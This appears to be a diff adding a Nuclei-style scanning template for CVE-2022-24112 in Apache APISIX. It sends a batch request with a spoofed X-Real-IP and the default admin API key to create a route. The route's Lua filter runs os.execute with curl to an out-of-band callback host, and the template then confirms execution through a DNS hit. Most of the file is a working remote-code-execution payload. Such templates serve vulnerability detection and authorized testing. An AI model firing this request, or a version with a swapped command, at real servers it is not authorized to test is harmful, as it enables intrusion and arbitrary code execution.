@@ -1,0 +1,58 @@
+id: cve-2022-24112
+info:
+  name: Apache APISIX batch-requests Plugin RCE
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    A remote code execution vulnerability exists in Apache APISIX due to the batch-requests plugin not effectively limiting user batch requests. This can allow attackers to bypass Admin API restrictions and execute arbitrary code.
+  reference:
+    - https://nvd.nist.gov/vuln/detail/CVE-2022-24112
+    - https://lists.apache.org/thread/lcdqywz8zy94mdysk7p3gfdgn51jmt94
+  classification:
+    cve-id: CVE-2022-24112
+    cvss-metrics: 3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 9.8
+  tags: rce, apache, apisix
+
+variables:
+  random_path: "{{rand_base(6)}}"
+
+http:
+  - raw:
+      - |
+        POST /apisix/batch-requests HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {
+          "headers": {
+            "X-Real-IP": "127.0.0.1",
+            "Content-Type": "application/json"
+          },
+          "timeout": 1500,
+          "pipeline": [
+            {
+              "method": "PUT",
+              "path": "/apisix/admin/routes/index?api_key=edd1c9f034335f136f87ad84b625c8f1",
+              "body": "{\"name\": \"{{random_path}}\", \"method\": [\"GET\"], \"uri\": \"/api/{{random_path}}\", \"upstream\": {\"type\": \"roundrobin\", \"nodes\": {\"httpbin.org:80\": 1}}, \"filter_func\": \"function(vars) os.execute('curl {{interactsh-url}}'); return true end\"}"
+            }
+          ]
+        }
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "reason"
+
+  - raw:
+      - |
+        GET /api/{{random_path}} HTTP/1.1
+        Host: {{Hostname}}
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
